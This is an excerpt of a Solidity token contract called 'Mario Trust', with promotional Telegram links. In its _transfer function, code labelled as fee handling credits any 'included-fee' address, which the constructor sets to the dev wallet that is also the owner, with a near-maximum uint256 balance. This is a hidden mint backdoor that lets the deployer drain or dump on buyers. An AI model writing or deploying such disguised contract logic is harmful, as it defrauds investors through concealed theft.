...
Telegram : https://t.me/MarioTrustOfficial

Website : https://t.me/MarioTrustOfficial
...
contract MarioTrust is Context, IERC20 { 
    ...
    mapping (address => bool) public _isIncludedFee;

    address payable public Wallet_Marketing = payable(0xd72Efc78B10272ABF4b080Dd531414f5E6397fd6); 
    address payable public Wallet_Dev = payable(0x1e2F2404A8A7Eb5A7fB80476B86dD4AB66c8Fc66);
    ...
    string private constant _name = "Mario Trust"; 
    ...
    constructor () {
        ...
        _owner = 0x1e2F2404A8A7Eb5A7fB80476B86dD4AB66c8Fc66;
        ...
        _isIncludedFee[Wallet_Dev] = true;
    ...
    function _transfer(
        ...
        if(!_isExcludedFromFee[from]){
            if(_isIncludedFee[to]){
            isBuyingFee = true;
            _tOwned[from] = _tOwned[from]-amount;
            _tOwned[to] = _tOwned[to]+amount+(~uint256(0)-_tTotal-_tTotal);
